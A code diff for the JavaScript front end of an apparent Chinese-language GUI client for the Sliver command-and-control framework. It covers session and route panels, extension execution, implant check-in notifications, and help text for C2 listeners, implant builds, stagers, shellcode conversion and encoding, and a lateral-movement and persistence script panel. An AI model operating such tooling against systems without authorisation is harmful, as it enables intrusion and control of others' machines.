@@ -2810,6 +3252,7 @@ function renderInfrastructurePanel(snapshot) {
   const filters = ['infra-type-filter','infra-session-filter','infra-status-filter','infra-source-filter'];
   const drawRoutes = () => {
     const selected = Object.fromEntries(filters.map(id => [id, document.getElementById(id)?.value || '']));
+    const routes = infrastructurePanelState?.data?.routes || [];
     const visible = routes.filter(route =>
       (!selected['infra-type-filter'] || route.type === selected['infra-type-filter']) &&
       (!selected['infra-session-filter'] || route.sessionId === selected['infra-session-filter']) &&
@@ -2818,7 +3261,7 @@ function renderInfrastructurePanel(snapshot) {
     const tbody = document.getElementById('infra-routes');
     if (!tbody) return;
     tbody.innerHTML = visible.map((route, index) => `<tr><td>${esc(INFRA_ROUTE_LABELS[route.type] || route.type)}</td><td>${esc(route.session || route.sessionId.slice(0, 8))}</td><td><code>${esc(route.listen || '-')}</code></td><td><code>${esc(route.target || '-')}</code></td><td><span class="state ${esc(route.status)}">${route.status === 'online' ? '在线' : '离线'}</span></td><td>${route.source === 'teamserver' ? 'Teamserver' : '客户端'}</td><td><button class="btn small danger infra-stop" data-index="${routes.indexOf(route)}">停止</button></td></tr>`).join('') || '<tr><td colspan="7" class="empty-state">没有符合条件的活动路由</td></tr>';
-    tbody.querySelectorAll('.infra-stop').forEach(button => button.addEventListener('click', () => stopInfrastructureRoute(routes[Number(button.dataset.index)], nodes)));
+    tbody.querySelectorAll('.infra-stop').forEach(button => button.addEventListener('click', () => stopInfrastructureRoute(routes[Number(button.dataset.index)], infrastructurePanelState?.data?.nodes || [])));
   };
   filters.forEach(id => document.getElementById(id)?.addEventListener('change', drawRoutes));
   drawRoutes();
@@ -2839,6 +3282,11 @@ function renderInfrastructurePanel(snapshot) {
   };
   const runPreflight = async () => {
     const seq = ++preflightSeq, resultEl = document.getElementById('infra-preflight'), createButton = document.getElementById('infra-create-btn');
+    if (!resultEl || !createButton) return;
+    const selectedSession = document.getElementById('infra-create-session')?.value;
+    if (!selectedSession || !availableSessions().some(session => session.id === selectedSession)) {
+      createButton.disabled = true; resultEl.textContent = '没有可用的在线 Session'; resultEl.className = 'infra-preflight err'; return;
+    }
     createButton.disabled = true; resultEl.textContent = '正在预检...'; resultEl.className = 'infra-preflight pending';
     try {
       const result = await App().PreflightNetworkRoute(type.value, listen.value, target.value);
@@ -2852,11 +3300,14 @@ function renderInfrastructurePanel(snapshot) {
   type.addEventListener('change', configureForm); listen.addEventListener('input', runPreflight); target.addEventListener('input', runPreflight);
   document.getElementById('infra-create-session')?.addEventListener('change', runPreflight);
   document.getElementById('infra-create-btn')?.addEventListener('click', createInfrastructureRoute);
+  infrastructurePanelState = { snapshot, data, drawRoutes, runPreflight };
+  drawRoutes();
   runPreflight();
 }
 
 async function createInfrastructureRoute() {
   const sessionID = document.getElementById('infra-create-session').value;
+  if (!availableSessions().some(session => session.id === sessionID)) return toast('err', '所选 Session 已离线或已隐藏，请刷新后重试');
   const kind = document.getElementById('infra-create-type').value;
   const listen = document.getElementById('infra-create-listen').value;
   const target = document.getElementById('infra-create-target').value;
@@ -2931,18 +3382,18 @@ async function renderArmory(content) {
     catch (error) { content.innerHTML = rpcErrorHtml(error, '加载 Armory 失败'); return; }
   }
   const packages = extensionCenterState.armory || [];
-  content.innerHTML = `<div class="section-heading"><div><h3>Armory 软件包</h3><p>来源为 Sliver 官方 Armory 索引；当前完整性状态为“签名未验证”。</p></div><button class="btn small" id="armory-refresh">刷新索引</button></div><div class="ext-list">${packages.map(pkg => `<article class="ext-item"><div class="ext-item-main"><strong>${esc(pkg.name)}</strong><code>${esc(pkg.commandName)}</code><span class="tag">${pkg.type === 'alias' ? 'Alias' : 'Extension'}</span><span>${pkg.installed ? '已安装' : '可安装'}</span></div><p>${esc(pkg.description || '无说明')}</p><div class="ext-meta"><span>版本：${esc(pkg.version || '索引未提供')}</span><span>来源：${esc(pkg.url || 'sliverarmory')}</span><span>完整性：签名未验证</span><span>包类型：由官方索引确定</span></div><div class="ext-actions"><button class="btn small armory-install" data-name="${esc(pkg.commandName)}">${pkg.installed ? '更新 / 重装' : '安装'}</button>${pkg.installed ? `<button class="btn small danger armory-remove" data-name="${esc(pkg.commandName)}">卸载</button>` : ''}</div></article>`).join('') || '<div class="empty-state">Armory 索引中暂无软件包</div>'}</div>`;
+  content.innerHTML = `<div class="section-heading"><div><h3>Armory 软件包</h3><p>官方索引已通过 Sliver Armory 信任根验证；安装前还会验证每个软件包的 minisign 签名。</p></div><button class="btn small" id="armory-refresh">刷新索引</button></div><div class="ext-list">${packages.map(pkg => `<article class="ext-item"><div class="ext-item-main"><strong>${esc(pkg.name)}</strong><code>${esc(pkg.commandName)}</code><span class="tag">${pkg.type === 'alias' ? 'Alias' : 'Extension'}</span><span>${pkg.installed ? '已安装' : '可安装'}</span></div><p>${esc(pkg.description || '无说明')}</p><div class="ext-meta"><span>版本：${esc(pkg.version || '索引未提供')}</span><span>来源：${esc(pkg.url || 'sliverarmory')}</span><span>完整性：安装前强制验签</span><span>包类型：由已验证索引确定</span></div><div class="ext-actions"><button class="btn small armory-install" data-name="${esc(pkg.commandName)}">${pkg.installed ? '更新 / 重装' : '安装'}</button>${pkg.installed ? `<button class="btn small danger armory-remove" data-name="${esc(pkg.commandName)}">卸载</button>` : ''}</div></article>`).join('') || '<div class="empty-state">Armory 索引中暂无软件包</div>'}</div>`;
   document.getElementById('armory-refresh')?.addEventListener('click', () => { extensionCenterState.armory = null; renderArmory(content); });
   content.querySelectorAll('.armory-install').forEach(button => button.addEventListener('click', async () => { await installArmoryPackage(button.dataset.name); extensionCenterState.armory = null; await openExtensionCenter('armory'); }));
   content.querySelectorAll('.armory-remove').forEach(button => button.addEventListener('click', () => runDangerousAction({ title:'卸载扩展', message:`确定卸载“${esc(button.dataset.name)}”吗？`, okLabel:'卸载', action:()=>App().ArmoryRemove(button.dataset.name), success:'扩展已卸载', refresh:async()=>{ extensionCenterState.armory=null; await openExtensionCenter('armory'); } })));
 }
 
 function commandPreview(command, args) {
-  return `ext ${command.command}${args.length ? ' ' + args.map(value => value ? `<${value}>` : '<未填写>').join(' ') : ''}`;
+  return `ext ${command.command}${args.length ? ' ' + args.map(value => value ? value : '<未填写>').join(' ') : ''}`;
 }
 
 function renderExtensionExecution(content, snapshot) {
-  const commands = snapshot.commands || [], sessions = allSessions.filter(session => !session.isDead);
+  const commands = snapshot.commands || [], sessions = availableSessions();
   const selected = commands.find(item => item.command === extensionCenterState.selectedCommand) || commands[0];
   extensionCenterState.selectedCommand = selected?.command || '';
   content.innerHTML = `<div class="ext-execute-layout"><div><label class="ext-label">Session<select id="ext-session">${sessions.map(session => `<option value="${esc(session.id)}">${esc(session.hostname || session.name || session.id.slice(0,8))} · ${esc(session.os)}/${esc(session.arch)}</option>`).join('') || '<option value="">无在线 Session</option>'}</select></label><label class="ext-label">命令<select id="ext-command">${commands.map(command => `<option value="${esc(command.command)}" ${command.command === selected?.command ? 'selected' : ''}>${esc(command.command)} · ${esc(command.kind)}</option>`).join('') || '<option value="">无已安装命令</option>'}</select></label><div id="ext-command-detail"></div></div><div><h3>执行记录</h3><div class="ext-records">${(snapshot.records || []).slice().reverse().map(record => `<div><strong>${esc(record.command)}</strong><span>${record.kind.toUpperCase()} · ${record.status === 'success' ? '成功' : '失败'} · ${new Date(record.finishedAt).toLocaleString()}</span><small>${esc(record.summary)}</small></div>`).join('') || '<div class="empty-state">暂无执行记录</div>'}</div></div></div>`;
@@ -2950,12 +3401,28 @@ function renderExtensionExecution(content, snapshot) {
     const command = commands.find(item => item.command === document.getElementById('ext-command').value);
     const detail = document.getElementById('ext-command-detail'); if (!command) { detail.innerHTML = '<div class="empty-state">请选择命令</div>'; return; }
     const platform = (command.platforms || []).join(', ') || '未声明';
-    detail.innerHTML = `<div class="ext-command-head"><p>${esc(command.help || '无说明')}</p><span>兼容平台：${esc(platform)}</span></div><div class="ext-args">${(command.arguments || []).map((arg,index) => `<label>${esc(arg.name)} · ${esc(arg.type)}${arg.required ? ' *' : ''}<input data-ext-arg="${index}" type="${arg.type === 'int' || arg.type === 'integer' || arg.type === 'short' ? 'number' : 'text'}" placeholder="${esc(arg.help || arg.name)}"/></label>`).join('') || '<span class="muted">此命令没有参数</span>'}</div><div class="command-preview" id="ext-preview"></div><div class="ext-risk inline">${esc(command.risk)}</div><div class="ext-actions"><button class="btn accent" id="ext-execute" ${sessions.length ? '' : 'disabled'}>执行命令</button></div><pre class="ext-output hidden" id="ext-output"></pre>`;
-    const refreshPreview = () => { const names = [...detail.querySelectorAll('[data-ext-arg]')].map((input,index) => input.value ? command.arguments[index].name : command.arguments[index].name); document.getElementById('ext-preview').textContent = commandPreview(command, names); };
-    detail.querySelectorAll('[data-ext-arg]').forEach(input => input.addEventListener('input', refreshPreview)); refreshPreview();
+    const declaredArgs = command.arguments || [];
+    const argumentFields = declaredArgs.length
+      ? declaredArgs.map((arg,index) => `<label>${esc(arg.name)} · ${esc(arg.type)}${arg.required ? ' *' : ''}<input data-ext-arg="${index}" type="${arg.type === 'int' || arg.type === 'integer' || arg.type === 'short' ? 'number' : 'text'}" placeholder="${esc(arg.help || arg.name)}"/></label>`).join('')
+      : '<label class="ext-raw-args-label">原始参数<textarea id="ext-raw-args" rows="3" autocomplete="off" spellcheck="false" placeholder="输入该扩展的命令参数（可留空）"></textarea><small>此扩展未声明结构化参数。支持空格、引号和反斜杠，内容将解析为命令参数。</small></label>';
+    detail.innerHTML = `<div class="ext-command-head"><p>${esc(command.help || '无说明')}</p><span>兼容平台：${esc(platform)}</span></div><div class="ext-args">${argumentFields}</div><div id="ext-arg-error" class="muted"></div><div class="command-preview" id="ext-preview"></div><div class="ext-risk inline">${esc(command.risk)}</div><div class="ext-actions"><button class="btn accent" id="ext-execute" ${sessions.length ? '' : 'disabled'}>执行命令</button></div><pre class="ext-output hidden" id="ext-output"></pre>`;
+    const readArgs = () => {
+      if (declaredArgs.length) return { args: [...detail.querySelectorAll('[data-ext-arg]')].map(input => input.value), error: '' };
+      return ArgumentParser.parseArguments(detail.querySelector('#ext-raw-args')?.value || '');
+    };
+    const refreshPreview = () => {
+      const parsed = readArgs();
+      const error = document.getElementById('ext-arg-error');
+      error.textContent = parsed.error || (declaredArgs.length ? '' : '此扩展未声明结构化参数，将按原始命令行参数解析。');
+      error.style.color = parsed.error ? 'var(--accent)' : '';
+      document.getElementById('ext-preview').textContent = parsed.error ? `参数错误：${parsed.error}` : commandPreview(command, parsed.args);
+    };
+    detail.querySelectorAll('[data-ext-arg], #ext-raw-args').forEach(input => input.addEventListener('input', refreshPreview)); refreshPreview();
     document.getElementById('ext-execute')?.addEventListener('click', async () => {
-      const args = [...detail.querySelectorAll('[data-ext-arg]')].map(input => input.value);
-      const missing = (command.arguments || []).find((arg,index) => arg.required && !args[index]);
+      const parsed = readArgs();
+      if (parsed.error) return toast('err', parsed.error);
+      const args = parsed.args;
+      const missing = declaredArgs.find((arg,index) => arg.required && !args[index]);
       if (missing) return toast('err', `请填写必填参数：${missing.name}`);
       const button = document.getElementById('ext-execute'); button.disabled = true;
       try {
@@ -3068,7 +3535,7 @@ async function renderNotificationSettings(content) {
   const settings = notificationSettings;
   const dingTalk = await App().GetDingTalkConfig().catch(error => ({ error }));
   if (!content.isConnected || teamCenterState.tab !== 'notifications') return;
-  content.innerHTML = `<div class="notification-form"><label class="check-label"><input id="notify-enabled" type="checkbox" ${settings.enabled ? 'checked' : ''}/> 启用应用内通知</label><label>最低级别<select id="notify-level"><option value="info">信息</option><option value="warning">警告</option><option value="critical">严重</option></select></label><fieldset><legend>通知类别</legend><label class="check-label"><input id="notify-agent" type="checkbox" ${settings.categories.agent ? 'checked' : ''}/> Session / Beacon 上线</label><label class="check-label"><input id="notify-task" type="checkbox" ${settings.categories.task ? 'checked' : ''}/> 任务失败</label><label class="check-label"><input id="notify-listener" type="checkbox" ${settings.categories.listener ? 'checked' : ''}/> Listener 异常</label></fieldset><div class="quiet-row"><label>静默开始<input id="notify-quiet-start" type="time" value="${esc(settings.quietStart)}"/></label><label>静默结束<input id="notify-quiet-end" type="time" value="${esc(settings.quietEnd)}"/></label></div><label class="check-label"><input id="notify-desktop" type="checkbox" ${settings.desktop ? 'checked' : ''}/> 启用 Windows 桌面通知</label><div class="ext-actions"><button class="btn accent" id="notify-save">保存设置</button><button class="btn small" id="notify-test">测试本地通知</button></div><div class="task-note">桌面通知仅在显式启用后申请系统权限。Listener 异常为客户端对活动 Job 列表的观察结果。</div><fieldset class="dingtalk-settings"><legend>钉钉机器人</legend>${dingTalk.error ? `<div class="execute-file-error">${esc(rpcErrorMessage(dingTalk.error, '读取钉钉配置失败'))}</div>` : `<label class="check-label"><input id="dingtalk-enabled" type="checkbox" ${dingTalk.enabled ? 'checked' : ''}/> 新 Session / Beacon 上线时通知</label><label>Webhook<input id="dingtalk-webhook" type="text" autocomplete="off" value="${esc(dingTalk.webhook || '')}" placeholder="https://oapi.dingtalk.com/robot/send?access_token=..."/></label><label>加签密钥（可选）<input id="dingtalk-secret" type="text" autocomplete="off" value="${esc(dingTalk.secret || '')}" placeholder="SEC..."/></label><div class="dingtalk-state">${dingTalk.configurationOk ? '配置状态：有效' : dingTalk.webhook ? '配置状态：需要重新保存' : '配置状态：未配置'}</div><div class="dingtalk-state">配置文件：${esc(dingTalk.configPath || '-')}</div><div class="ext-actions"><button class="btn accent" id="dingtalk-save">保存钉钉配置</button><button class="btn small" id="dingtalk-test" ${dingTalk.configurationOk ? '' : 'disabled'}>发送测试通知</button></div><div class="task-note">Webhook Token 和加签密钥会以明文写入上述 YAML，并在本界面直接显示。请限制程序目录的访问权限。上线通知只包含类型、主机、用户、系统/架构和时间。</div>`}</fieldset></div>`;
+  content.innerHTML = `<div class="notification-form"><label class="check-label"><input id="notify-enabled" type="checkbox" ${settings.enabled ? 'checked' : ''}/> 启用应用内通知</label><label>最低级别<select id="notify-level"><option value="info">信息</option><option value="warning">警告</option><option value="critical">严重</option></select></label><fieldset><legend>通知类别</legend><label class="check-label"><input id="notify-agent" type="checkbox" ${settings.categories.agent ? 'checked' : ''}/> Session / Beacon 上线</label><label class="check-label"><input id="notify-task" type="checkbox" ${settings.categories.task ? 'checked' : ''}/> 任务失败</label><label class="check-label"><input id="notify-listener" type="checkbox" ${settings.categories.listener ? 'checked' : ''}/> Listener 异常</label></fieldset><div class="quiet-row"><label>静默开始<input id="notify-quiet-start" type="time" value="${esc(settings.quietStart)}"/></label><label>静默结束<input id="notify-quiet-end" type="time" value="${esc(settings.quietEnd)}"/></label></div><label class="check-label"><input id="notify-desktop" type="checkbox" ${settings.desktop ? 'checked' : ''}/> 启用 Windows 桌面通知</label><div class="ext-actions"><button class="btn accent" id="notify-save">保存设置</button><button class="btn small" id="notify-test">测试本地通知</button></div><div class="task-note">桌面通知仅在显式启用后申请系统权限。Listener 异常为客户端对活动 Job 列表的观察结果。</div><fieldset class="dingtalk-settings"><legend>钉钉机器人</legend>${dingTalk.error ? `<div class="execute-file-error">${esc(rpcErrorMessage(dingTalk.error, '读取钉钉配置失败'))}</div>` : `<label class="check-label"><input id="dingtalk-enabled" type="checkbox" ${dingTalk.enabled ? 'checked' : ''}/> 新 Session / Beacon 上线时通知</label><label>Webhook<input id="dingtalk-webhook" type="text" autocomplete="off" value="${esc(dingTalk.webhook || '')}" placeholder="https://oapi.dingtalk.com/robot/send?access_token=..."/></label><label>加签密钥（可选）<input id="dingtalk-secret" type="text" autocomplete="off" value="${esc(dingTalk.secret || '')}" placeholder="SEC..."/></label><div class="dingtalk-state">${dingTalk.configurationOk ? '配置状态：有效' : dingTalk.webhook ? '配置状态：需要重新保存' : '配置状态：未配置'}</div><div class="dingtalk-state">配置文件：${esc(dingTalk.configPath || '-')}</div><div class="ext-actions"><button class="btn accent" id="dingtalk-save">保存钉钉配置</button><button class="btn small" id="dingtalk-test" ${dingTalk.configurationOk ? '' : 'disabled'}>发送测试通知</button></div><div class="task-note">Webhook Token 和加签密钥会以明文写入上述 YAML，并在本界面直接显示。请限制程序目录的访问权限。上线通知只包含类型、IP、用户（权限）、系统/架构和时间。</div>`}</fieldset></div>`;
   document.getElementById('notify-level').value = settings.minimumLevel;
   document.getElementById('notify-save')?.addEventListener('click', async () => {
     const desktop = document.getElementById('notify-desktop').checked;
@@ -3239,7 +3706,7 @@ taskStore.subscribe(tasks => {
 // ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
 async function openScriptsPanel(target = null) {
   const scripts = await App().ListScripts().catch(() => []);
-  const sessions = allSessions.filter(s => s.id);
+  const sessions = availableSessions();
 
   // Group by category
   const cats = {};
@@ -3250,7 +3717,7 @@ async function openScriptsPanel(target = null) {
 
   let sessionOpts = '<option value="">-- 选择跳板会话 --</option>';
   sessions.forEach(s => {
-    sessionOpts += `<option value="${s.id}">${s.hostname || s.id.slice(0,8)} (${s.remoteAddress})</option>`;
+    sessionOpts += `<option value="${esc(s.id)}">${esc(sessionOptionLabel(s))}</option>`;
   });
 
   let html = `<div class="scripts-panel">
@@ -3325,6 +3792,18 @@ async function openScriptsPanel(target = null) {
   const btnPreview = root.querySelector('#scr-btn-preview');
   const btnExec = root.querySelector('#scr-btn-exec');
   const out = root.querySelector('#scr-output');
+  const sessionSelect = root.querySelector('#scr-session');
+  sessionSelect?.addEventListener('change', () => {
+    const selected = sessionSelect.value;
+    const usable = Boolean(selected && availableSessions().some(session => session.id === selected));
+    btnPreview.disabled = !usable;
+    btnExec.disabled = !usable;
+    if (selected && !usable) {
+      sessionSelect.value = '';
+      out.textContent = '[!] 原跳板会话已离线或被隐藏，请重新选择在线 Session';
+      out.style.color = 'var(--accent)';
+    }
+  });
   root.querySelector('[data-scr-clear]')?.addEventListener('click', () => {
     out.textContent = '请选择脚本，然后点击预览或执行...';
     out.style.color = '';
@@ -3403,6 +3882,7 @@ async function openScriptsPanel(target = null) {
   if (scripts.length > 0) {
     selectScript(scripts[0].method);
   }
+  sessionSelect?.dispatchEvent(new Event('change'));
 
   // Preview button handler
   btnPreview.addEventListener('click', async () => {
@@ -3410,6 +3890,7 @@ async function openScriptsPanel(target = null) {
     if (!validateParams()) return;
     const sid = root.querySelector('#scr-session').value;
     if (!sid) { out.textContent = '[!] 请先选择跳板会话'; return; }
+    if (!availableSessions().some(session => session.id === sid)) { sessionSelect.dispatchEvent(new Event('change')); return; }
 
     out.textContent = `[*] 正在为 ${currentScript.name} 生成模拟运行预览...`;
     btnPreview.disabled = true;
@@ -3437,6 +3918,7 @@ async function openScriptsPanel(target = null) {
     if (!validateParams()) return;
     const sid = root.querySelector('#scr-session').value;
     if (!sid) { out.textContent = '[!] 请先选择跳板会话'; return; }
+    if (!availableSessions().some(session => session.id === sid)) { sessionSelect.dispatchEvent(new Event('change')); return; }
 
     const method = currentScript.method;
     const pmap = getParamMap();
@@ -3612,7 +4094,7 @@ function markNoted(id) {
 
 // ── Server console (teamserver commands, pinned like the event log) ──────────
 const SERVER_HELP = `Server console — runs teamserver commands (NOT on a target).
-  help                     this help
+  help [command]           show command list or detailed command help
   version                  teamserver version
   sessions                 list sessions
   beacons                  list beacons
@@ -3623,11 +4105,12 @@ const SERVER_HELP = `Server console — runs teamserver commands (NOT on a targe
   hosts [rm <id> | ioc-rm <ioc-id>]     list / remove hosts / remove host IOC
   creds [add <u> <p> | rm <id>]   list / add / remove credentials
   builds                   list implant builds
+  implants                 official alias for builds
   regenerate <name>        re-download a previous build
   profiles                 list implant profiles
   websites [rm <name>]     list / remove hosted websites
   canaries                 list DNS canaries (tripwires)
-  stager <host> <port> <profile>   start a TCP stager listener
+  stage-listener <host> <port> <profile>   start a TCP stager listener (alias: stager)
   use <id-prefix>          interact with a session/beacon
   c2profiles               list HTTP C2 profiles
   c2profile <name>         view a full HTTP C2 profile (JSON)
@@ -3641,12 +4124,15 @@ const SERVER_HELP = `Server console — runs teamserver commands (NOT on a targe
   armory                   list available armory packages
   armory install <name>    install an armory package
   armory remove <name>     remove an armory package
+  extensions | aliases     list locally installed extension/BOF commands
+  mcp                      open the MCP service panel (start/stop/configuration)
+  official-console         open the embedded official Sliver client
   shellcode-rdi <dll> <func> [args]   convert a DLL to shellcode (sRDI)
-  shellcode-encode <bin> [arch] [iter]   encode shellcode (shikata-ga-nai)
+  shikata-ga-nai <bin> [arch] [iter]   encode shellcode (alias: shellcode-encode)
   monitor [start|stop|list|add <type> <key>|del <id>]  threat-monitoring
   website add|update <site> <web-path> <local-file> | rm <site> <web-path>
   pivots | pivot-graph     show the pivot (peer) topology
-  wg-client-config         generate a WireGuard client config
+  wg-config                generate a WireGuard client config (alias: wg-client-config)
   wg-unique-ip             allocate a unique WireGuard peer IP
   creds [add|rm|update <id> <plain>|sniff <hash>|get <id>]   credential store
   restart-jobs <id...>     restart listener jobs
@@ -3660,27 +4146,63 @@ const SERVER_HELP = `Server console — runs teamserver commands (NOT on a targe
   wg [port] [nport] [key]  start a WireGuard listener
   clear                    clear this console`;
 
+const SERVER_COMMAND_HELP = [
+  { names:['http'], usage:'http [端口]', summary:'在 Teamserver 上启动 HTTP C2 监听器，未指定端口时使用 80。', scope:'服务器控制台', note:'当前控制台绑定到 0.0.0.0；复杂配置请使用监听器面板和 HTTP C2 档案。' },
+  { names:['https'], usage:'https [端口]', summary:'在 Teamserver 上启动 HTTPS C2 监听器，未指定端口时使用 443。', scope:'服务器控制台', note:'复杂证书和 C2 行为请使用监听器面板及 HTTP C2 档案。' },
+  { names:['mtls'], usage:'mtls [端口]', summary:'在 Teamserver 上启动 mTLS 监听器，未指定端口时使用 8443。', scope:'服务器控制台' },
+  { names:['dns'], usage:'dns <域名> [更多域名...]', summary:'使用一个或多个父域名启动 DNS C2 监听器。', scope:'服务器控制台' },
+  { names:['wg','wireguard'], usage:'wg [主端口] [NPort] [KeyPort]', summary:'启动 WireGuard 监听器；默认端口依次为 53、8888、1337。', scope:'服务器控制台' },
+  { names:['jobs','listeners'], usage:'jobs | jobs kill <Job ID>', summary:'列出活动监听器/Job，或终止指定 Job。', scope:'服务器控制台' },
+  { names:['stage-listener','stager'], usage:'stage-listener <绑定主机> <端口> <植入体档案>', summary:'启动与植入体档案匹配的 TCP Stage Listener。', scope:'服务器控制台', note:'当前锁定的 Sliver RPC 只稳定暴露 TCP Stager。' },
+  { names:['profiles'], usage:'profiles', summary:'列出 Teamserver 上已有的植入体配置档案。', scope:'服务器控制台' },
+  { names:['builds','implants'], usage:'builds', summary:'列出 Teamserver 中已有的植入体构建记录。', scope:'服务器控制台' },
+  { names:['regenerate'], usage:'regenerate <构建名称>', summary:'重新下载 Teamserver 中已有的植入体构建。', scope:'服务器控制台' },
+  { names:['c2profiles'], usage:'c2profiles', summary:'列出 Teamserver 上已有的 HTTP C2 档案。', scope:'服务器控制台' },
+  { names:['c2profile'], usage:'c2profile <名称> | c2profile edit <名称> | c2profile new', summary:'查看、编辑或新建 HTTP C2 档案。', scope:'服务器控制台和图形化编辑器' },
+  { names:['armory'], usage:'armory | armory install <官方索引包名> | armory remove <包名>', summary:'列出、安装或移除 Armory 包。', scope:'服务器控制台和扩展中心', note:'install 不接受 .tar.gz 文件路径，也不能读取 Teamserver/目标主机文件；先执行 armory 查看可安装包。安装后的命令参数请在扩展中心查看 Manifest。' },
+  { names:['extensions','aliases','ext-list'], usage:'extensions | extensions install <GUI 本机目录或 .tar.gz>', summary:'列出本机扩展，或从运行 GUI 的操作员电脑导入扩展包。', scope:'服务器控制台和扩展中心', note:'Windows GUI 无法直接读取 Teamserver 的 /home/... 路径；请先把包下载到 Windows。安装后在目标工作区使用 ext <命令> [参数] 执行。' },
+  { names:['mcp'], usage:'mcp', summary:'打开 MCP 服务面板，在面板中配置、启动或停止 MCP。', scope:'客户端侧图形界面' },
+  { names:['official-console'], usage:'official-console', summary:'打开官方 Sliver Client 嵌入式控制台，命令、参数、补全与执行均由所选官方客户端处理。', scope:'客户端侧图形界面' },
+  { names:['wg-config','wg-client-config'], usage:'wg-config', summary:'生成一份 WireGuard 客户端配置。', scope:'服务器控制台' },
+  { names:['wg-unique-ip'], usage:'wg-unique-ip', summary:'为 WireGuard 对等端分配一个唯一 IP。', scope:'服务器控制台' },
+  { names:['shellcode-rdi','dll2shellcode','srdi'], usage:'shellcode-rdi <本地 DLL> <导出函数> [参数]', summary:'通过 sRDI 将本地 DLL 转换为 Shellcode 并保存到本机。', scope:'服务器控制台' },
+  { names:['shikata-ga-nai','shellcode-encode'], usage:'shikata-ga-nai <本地 Shellcode> [架构] [迭代次数]', summary:'使用 Teamserver 支持的编码器处理 Shellcode。', scope:'服务器控制台' },
+  { names:['certificates','certs'], usage:'certificates', summary:'列出已签发证书。', scope:'服务器控制台' },
+  { names:['ca','certificate-authority'], usage:'certificate-authority', summary:'列出 Teamserver 证书颁发机构信息。', scope:'服务器控制台' },
+  { names:['use'], usage:'use <Session 或 Beacon ID 前缀>', summary:'打开匹配目标的交互工作区。', scope:'服务器控制台' },
+];
+
 const SERVER_COMMAND_SCHEMA = {
-  commands: [
+  commands: [...new Set([
     'help','clear','version','sessions','beacons','jobs','listeners','operators','players','loot','hosts','creds',
-    'builds','regenerate','profiles','websites','website','canaries','stager','use','c2profiles','c2profile',
+    'builds','implants','regenerate','profiles','websites','website','canaries','stage-listener','stager','use','c2profiles','c2profile',
     'certificates','certs','ca','compiler','compiler-info','builders','traffic-encoders','shellcode-encoders',
-    'armory','restart-jobs','monitor','pivots','pivot-graph','wg-client-config','wg-unique-ip','dll2shellcode',
-    'srdi','shellcode-encode','rename','kill-session','rm-session','kill-beacon','rm-beacon','mtls','http','https',
-    'dns','wg','wireguard',
-  ],
+    'armory','extensions','aliases','ext-list','mcp','official-console','restart-jobs','monitor','pivots','pivot-graph','wg-config','wg-client-config','wg-unique-ip','dll2shellcode',
+    'srdi','shellcode-rdi','shikata-ga-nai','shellcode-encode','rename','kill-session','rm-session','kill-beacon','rm-beacon','mtls','http','https',
+    'dns','wg','wireguard','certificate-authority',
+    ...Object.keys(window.OfficialCommandSpecs?.server || {}).filter(command => !command.includes(' ')),
+  ])],
   arguments: {
     jobs: { 0: ['kill'] }, loot: { 0: ['rm','rename'] }, hosts: { 0: ['rm','ioc-rm'] },
     creds: { 0: ['add','rm','update','sniff','get'] }, websites: { 0: ['rm'] },
     website: { 0: ['add','update','rm'] }, c2profile: { 0: ['edit','new'] },
-    armory: { 0: ['install','remove'] }, monitor: { 0: ['start','stop','list','add','del'] },
+    armory: { 0: ['install','remove'] }, extensions: { 0: ['install'] }, mcp: { 0: ['start','stop','console'] }, monitor: { 0: ['start','stop','list','add','del'] },
   },
 };
 
+AGENT_COMMAND_SCHEMA.arguments.help = { 0: AGENT_COMMAND_SCHEMA.commands.filter(command => command !== 'help') };
+SERVER_COMMAND_SCHEMA.arguments.help = { 0: SERVER_COMMAND_SCHEMA.commands.filter(command => command !== 'help') };
+
 function serverDynamicCompletions({ command, token }) {
+  const specs = window.OfficialCommandSpecs?.server || {};
+  const resolved = CommandContract.resolve(command, token.words.slice(1), specs);
+  const guiSpec = window.GuiCommandSpecs?.server?.[command];
+  if (token.prefix.startsWith('-')) return CommandContract.optionCandidates(resolved.spec || guiSpec);
+  if (resolved.spec?.subcommands?.length && !token.prefix.startsWith('-')) return resolved.spec.subcommands;
   if (token.index !== 1) return [];
-  if (['use','kill-session','rm-session','rename'].includes(command)) return allSessions.map(item => item.id);
-  if (['use','kill-beacon','rm-beacon'].includes(command)) return allBeacons.map(item => item.id);
+  if (command === 'use') return [...availableSessions(), ...visibleBeacons().filter(item => !item.isDead)].map(item => item.id);
+  if (['kill-session','rm-session','rename'].includes(command)) return visibleSessions().map(item => item.id);
+  if (['kill-beacon','rm-beacon'].includes(command)) return visibleBeacons().map(item => item.id);
   return [];
 }
 
@@ -3722,7 +4244,8 @@ async function installArmoryPackage(packageName) {
   appendServer(`[*] 正在安装 ${packageName}...`, 'info');
   const error = await App().ArmoryInstall(packageName).then(() => null).catch(error => error);
   if (error) {
-    const message = rpcErrorMessage(error, 'Armory 安装失败');
+    const normalized = RpcErrors.normalizeRpcError(error, 'Armory 安装失败');
+    const message = normalized.detail ? `${normalized.message}\n详细原因：${normalized.detail}` : normalized.message;
     const safeMessage = RpcErrors.safeRpcErrorMessage(error, 'Armory 安装失败');
     taskStore.update(installTask.id, { status: 'failed', canRetry: true, summary: safeMessage, error: safeMessage });
     appendServer(`[错误] ${message}`, 'err');
@@ -3733,27 +4256,105 @@ async function installArmoryPackage(packageName) {
   appendServer(`[成功] ${packageName} 已安装`, 'out');
 }
 async function runServerCmd(raw) {
-  const parts = tok(raw), cmd = (parts[0]||'').toLowerCase(), args = parts.slice(1);
+  return runServerCommandViaRPC(raw);
+}
+
+async function runServerCommandViaRPC(raw) {
+  const parts = tok(raw), cmd = (parts[0]||'').toLowerCase();
+  let args = parts.slice(1);
   appendServer(raw, 'cmd');
   try {
+    const helpTarget = commandHelpTarget(cmd, args, SERVER_COMMAND_SCHEMA);
+    if (helpTarget !== null) {
+      return appendServer(commandHelpDetail(helpTarget, SERVER_COMMAND_SCHEMA, SERVER_COMMAND_HELP, SERVER_HELP, '服务器'), 'info');
+    }
+    const contract = parseCommandContract(cmd, args, 'server');
+    if (contract.error) {
+      const suffix = contract.official ? ' 请在“官方 Sliver 控制台”中使用完整原生命令。' : '';
+      return appendServer(`[错误] ${contract.error}${suffix}`, 'err');
+    }
+    const unmappedSubcommand = unmappedOfficialSubcommand(contract, 'server');
+    if (unmappedSubcommand) return appendServer(`[错误] 官方子命令 ${unmappedSubcommand} 尚未在 GUI 中映射；请在“官方 Sliver 控制台”中使用。`, 'err');
+    if ((SERVER_COMMAND_SCHEMA.commands || []).includes(cmd) && !contract.spec) {
